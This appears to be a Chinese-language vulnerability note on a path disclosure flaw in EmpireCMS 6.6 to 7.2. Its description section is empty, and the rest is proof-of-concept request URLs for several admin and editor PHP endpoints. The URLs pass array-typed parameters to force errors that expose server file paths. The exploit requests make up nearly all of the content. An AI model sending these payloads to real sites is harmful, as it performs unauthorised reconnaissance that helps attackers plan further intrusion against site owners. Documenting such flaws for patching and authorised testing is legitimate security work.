EmpireCMS 6.6-7.2 路径泄漏
==========================

一、漏洞简介
------------

二、漏洞影响
------------

EmpireCMS 6.6-7.2

三、复现过程
------------

### POC :

> EmpireCMS 6.6 :

    http://www.0-sec.org/e/admin/tool/ShowPic.php?url[]=kongxin&pic_height[]=kongxin&pic_width[]=kongxin&picurl[]=kongxin& 

    http://www.0-sec.org/e/action/ListInfo.php?totalnum[]=kongxin&page[]=kongxin&myorder[]=kongxin&orderby[]=kongxin&andor[]=kongxin&ph[]=kongxin&tempid[]=kongxin&line[]=kongxin&endtime[]=kongxin&starttime[]=kongxin&ztid[]=kongxin&ttid[]=kongxin&classid[]=kongxin&mid[]=kongxin&

> EmpireCMS 7.0 :

    http://www.0-sec.org/e/admin/ecmseditor/infoeditor/epage/TranMore.php?InstanceName[]=kongxin&sinfo[]=kongxin&modtype[]=kongxin&infoid[]=kongxin&filepass[]=kongxin&classid[]=kongxin&showmod[]=kongxin&

> EmpireCMS 7.2 :

    http://www.0-sec.org/e/data/ecmseditor/infoeditor/epage/TranFile.php?filesize[]=kongxin&fname[]=kongxin&InstanceName[]=kongxin&filepass[]=kongxin&classid[]=kongxin&type[]=kongxin&showmod[]=kongxin&
